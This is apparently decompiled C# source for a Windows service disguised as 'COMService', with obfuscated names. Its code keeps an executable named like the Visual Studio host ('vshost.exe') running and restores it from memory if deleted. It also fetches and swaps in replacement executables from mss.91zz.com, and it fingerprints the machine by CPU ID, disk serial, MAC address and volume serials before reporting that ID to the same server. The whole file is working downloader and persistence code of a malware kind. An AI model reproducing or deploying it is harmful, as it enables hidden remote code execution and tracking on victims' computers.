using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace COMService;

public class GClass0 : ServiceBase
{
	private IContainer icontainer_0;

	private string string_0 = "7";

	private string string_1 = "";

	private string string_2 = "vshost";

	private string string_3 = "";

	private string string_4 = "http://mss.91zz.com/getupdatevshost.aspx?md5=";

	private string string_5 = "http://mss.91zz.com/vshost.exe";

	private string string_6 = "";

	private Thread thread_0;

	private bool bool_0 = true;

	private byte[] byte_0;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void method_0()
	{
		icontainer_0 = new Container();
		((ServiceBase)this).set_ServiceName("Service1");
	}

	[DllImport("kernel32.dll")]
	private static extern int GetVolumeInformation(string lpRootPathName, string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, int lpMaximumComponentLength, int lpFileSystemFlags, string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("Iphlpapi.dll")]
	private static extern int SendARP(int dest, int host, ref long mac, ref int length);

	[DllImport("Ws2_32.dll")]
	private static extern int inet_addr(string ip);

	public GClass0()
	{
		method_0();
	}

	protected override void OnStart(string[] args)
	{
		string_1 = AppDomain.CurrentDomain.BaseDirectory;
		bool_0 = true;
		string_6 = string_1 + "\\" + string_2 + ".exe";
		ThreadStart start = method_1;
		thread_0 = new Thread(start);
		thread_0.Start();
		ThreadStart start2 = method_2;
		Thread thread = new Thread(start2);
		thread.Start();
		ThreadStart start3 = method_4;
		Thread thread2 = new Thread(start3);
		thread2.Start();
	}

	private void method_1()
	{
		while (true)
		{
			try
			{
				if (bool_0 && File.Exists(string_6))
				{
					FileStream fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read);
					byte_0 = new byte[fileStream.Length];
					fileStream.Read(byte_0, 0, (int)fileStream.Length);
					fileStream.Close();
					bool_0 = false;
				}
				while (!File.Exists(string_6) && byte_0 != null)
				{
					try
					{
						FileStream fileStream2 = File.Create(string_6);
						fileStream2.Write(byte_0, 0, byte_0.Length);
						fileStream2.Close();
					}
					catch (Exception)
					{
						Thread.Sleep(500);
						continue;
					}
					break;
				}
				bool flag = false;
				Process[] processes = Process.GetProcesses();
				for (int i = 0; i < processes.Length; i++)
				{
					if (processes[i].ProcessName.ToLower().Trim() == string_2)
					{
						flag = true;
						break;
					}
				}
				if (!flag && File.Exists(string_6))
				{
					Process.Start(string_6);
					do
					{
						Thread.Sleep(500);
					}
					while (Process.GetProcessesByName(string_2).Length <= 0);
					Process.GetCurrentProcess().Kill();
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(500);
		}
	}

	private void method_2()
	{
		int num = 5;
		while (true)
		{
			if (!File.Exists(string_6) && byte_0 == null)
			{
				method_3();
			}
			if (File.Exists(string_6) || byte_0 != null)
			{
				DateTime now = DateTime.Now;
				try
				{
					MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
					FileStream fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
					mD5CryptoServiceProvider.ComputeHash(fileStream);
					byte[] hash = mD5CryptoServiceProvider.Hash;
					StringBuilder stringBuilder = new StringBuilder();
					byte[] array = hash;
					foreach (byte b in array)
					{
						stringBuilder.Append($"{b:X1}");
					}
					fileStream.Close();
					string text = stringBuilder.ToString();
					WebClient webClient = new WebClient();
					string text2 = webClient.DownloadString(string_4 + text);
					if (text2 != null && text2.Trim() != "")
					{
						string[] array2 = text2.Split(new char[1] { '|' });
						if (array2.Length >= 3)
						{
							if (array2[1] == "0")
							{
								break;
							}
							num = int.Parse(array2[2]);
							if (array2[0] == "T")
							{
								string text3 = string_1 + "\\temp" + string_2 + ".exe";
								if (File.Exists(text3))
								{
									File.Delete(text3);
								}
								webClient.DownloadFile(string_5, text3);
								if (File.Exists(text3))
								{
									MD5CryptoServiceProvider mD5CryptoServiceProvider2 = new MD5CryptoServiceProvider();
									FileStream fileStream2 = new FileStream(text3, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
									mD5CryptoServiceProvider2.ComputeHash(fileStream2);
									byte[] hash2 = mD5CryptoServiceProvider2.Hash;
									StringBuilder stringBuilder2 = new StringBuilder();
									byte[] array3 = hash2;
									foreach (byte b2 in array3)
									{
										stringBuilder2.Append($"{b2:X1}");
									}
									fileStream2.Close();
									if (array2[3] == stringBuilder2.ToString())
									{
										thread_0.Suspend();
										while (thread_0.ThreadState != System.Threading.ThreadState.Suspended)
										{
											Thread.Sleep(500);
											try
											{
												thread_0.Suspend();
											}
											catch
											{
											}
										}
										if (File.Exists(string_6))
										{
											string text4 = string_1 + "\\vtempfile.exe";
											if (File.Exists(text4))
											{
												File.Delete(text4);
											}
											File.Move(string_6, text4);
											File.Move(text3, string_6);
										}
										else
										{
											File.Move(text3, string_6);
										}
										Process[] processes = Process.GetProcesses();
										for (int k = 0; k < processes.Length; k++)
										{
											if (processes[k].ProcessName.ToLower().Trim() == string_2)
											{
												processes[k].Kill();
											}
										}
										bool_0 = true;
										thread_0.Resume();
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
					try
					{
						if (thread_0.ThreadState != 0)
						{
							thread_0.Resume();
						}
					}
					catch
					{
					}
				}
				while (DateTime.Now <= now.AddMinutes(num))
				{
					Thread.Sleep(60000);
				}
			}
			else
			{
				Thread.Sleep(500);
			}
		}
	}

	private void method_3()
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(string_5, string_6);
		}
		catch
		{
		}
	}

	private void method_4()
	{
		try
		{
			method_5();
			if (File.Exists(string_1 + "\\whichagent.txt"))
			{
				string text = File.ReadAllText(string_1 + "\\whichagent.txt");
				if (text != null && text.Trim() != "")
				{
					string text2 = "http://mss.91zz.com/whichagent.aspx?guid=";
					text2 = text2 + string_3 + "&whichone=" + text.Trim() + "&version=" + string_0;
					WebClient webClient = new WebClient();
					webClient.DownloadString(text2);
				}
			}
		}
		catch
		{
		}
	}

	protected override void OnStop()
	{
	}

	private void method_5()
	{
		string text = "null";
		try
		{
			text = method_6() + method_7();
			text = text.Replace("0", "").Replace(" ", "");
			if (text == "")
			{
				string text2 = method_8("localhost").ToString().Trim();
				if (text2 == "0")
				{
					text2 = method_10();
					if (text2.Trim() == "")
					{
						text2 = "null";
					}
				}
				text = text2;
			}
		}
		catch
		{
		}
		string_3 = text;
	}

	private string method_6()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string result = null;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val).get_Properties().get_Item("ProcessorId").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "";
		}
	}

	private string method_7()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
			string result = null;
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (((ManagementBaseObject)val2).get_Item("SerialNumber") != null)
					{
						result = ((ManagementBaseObject)val2).get_Item("SerialNumber").ToString()!.Trim();
					}
					else
					{
						ManagementObjectSearcher val3 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
						ManagementObjectEnumerator enumerator2 = val3.Get().GetEnumerator();
						try
						{
							if (enumerator2.MoveNext())
							{
								ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
								result = ((ManagementBaseObject)val4).get_Item("Model").ToString();
							}
						}
						finally
						{
							((IDisposable)enumerator2)?.Dispose();
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return "";
		}
	}

	private long method_8(string string_7)
	{
		int dest = inet_addr(string_7);
		try
		{
			long mac = 0L;
			int length = 6;
			SendARP(dest, 0, ref mac, ref length);
			return mac;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	public string method_9(string string_7)
	{
		try
		{
			int lpVolumeSerialNumber = 0;
			string lpVolumeNameBuffer = null;
			string lpFileSystemNameBuffer = null;
			GetVolumeInformation(string_7 + ":\\", lpVolumeNameBuffer, 256, ref lpVolumeSerialNumber, 0, 0, lpFileSystemNameBuffer, 256);
			return lpVolumeSerialNumber.ToString("x");
		}
		catch
		{
			return "";
		}
	}

	private string method_10()
	{
		string text = "";
		try
		{
			text += method_9("C");
		}
		catch
		{
		}
		try
		{
			text += method_9("D");
		}
		catch
		{
		}
		try
		{
			text += method_9("E");
		}
		catch
		{
		}
		try
		{
			text += method_9("F");
			return text;
		}
		catch
		{
			return text;
		}
	}
}
